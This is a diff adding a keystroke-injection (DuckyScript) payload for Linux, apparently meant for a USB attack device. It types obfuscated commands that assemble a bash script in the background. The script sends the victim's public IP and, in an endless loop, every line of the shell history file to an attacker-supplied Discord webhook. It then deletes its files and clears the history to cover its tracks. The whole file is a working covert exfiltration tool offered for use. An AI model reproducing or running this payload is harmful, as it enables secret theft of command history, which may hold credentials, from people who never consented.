@@ -1,0 +1,66 @@
+REM     Requirements:
+REM     - Os: LINUX. Kali linux (instead of .bash_history use .zsh_history)
+REM     - Internet Connection
+REM     - Discord webhook --> use your Discord Webhook instead of https://discordapp.com/api/webhooks/<webhook_id>/<token>
+
+DELAY 500
+ALT F2
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 500
+
+
+REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+STRING cd; echo $XMODIFIERS > modd.txt; am=$(head -c 1 modd.txt); r='"'; if [ $am == $r ]; then r='@'; fi;
+ENTER
+DELAY 1400
+STRING man printf > modd.txt; sed -n '20p' modd.txt > modd2.txt; am=$(cut -c 8 modd2.txt); rm modd2.txt
+ENTER
+DELAY 1400
+STRING printf %s 'curl -X POST -H ' > discord_history.sh; printf %s $r >> discord_history.sh; printf %s 'Content-Type: application/json' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' -d ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s { >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s content >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ': ' >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s ' '; printf %s $r >> discord_history.sh; printf %s '$(curl ifconfig.me)' >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s } >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s 'https://discordapp.com/api/webhooks/<webhook_id>/<token>' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh; bash ./discord_history.sh
+ENTER
+DELAY 1400
+STRING clear
+ENTER
+DELAY 1400
+STRING printf %s 'history_file=' > discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$HOME/.bash_history' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh
+ENTER
+DELAY 1400
+STRING printf %s 'while true; do' >> discord_history.sh
+ENTER
+DELAY 1400
+STRING printf %s '    if [ -f ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$history_file' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' ] && [ -s ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$history_file' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' ]; then' >> discord_history.sh; echo >> discord_history.sh
+ENTER
+DELAY 1400
+STRING clear
+ENTER
+DELAY 1400
+STRING printf %s '        while read -r line; do' >> discord_history.sh; echo >> discord_history.sh
+ENTER
+DELAY 1400
+STRING printf %s '            contenx=' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$line' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh
+ENTER
+DELAY 1400
+STRING clear
+ENTER
+DELAY 1400
+STRING printf %s '            curl -X POST -H ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s 'Content-Type: application/json' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' -d ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s { >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s content >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ': ' >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s ' '; printf %s $r >> discord_history.sh; printf %s '$contenx' >> discord_history.sh; printf %s $am >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s } >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s ' ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s 'https://discordapp.com/api/webhooks/<webhook_id>/<token>' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh
+ENTER
+DELAY 1400
+STRING clear
+ENTER
+DELAY 1400 
+STRING printf %s '        ' >> discord_history.sh; printf %s done >> discord_history.sh; printf %s ' < ' >> discord_history.sh; printf %s $r >> discord_history.sh; printf %s '$history_file' >> discord_history.sh; printf %s $r >> discord_history.sh; echo >> discord_history.sh
+ENTER
+DELAY 1400
+STRING printf %s '    fi' >> discord_history.sh; clear
+ENTER
+DELAY 1400
+STRING bash ./discord_history.sh &
+ENTER
+DELAY 1400
+STRING clear
+ENTER
+STRING rm modd.txt; rm discord_history.sh; history -c; exit;
+ENTER
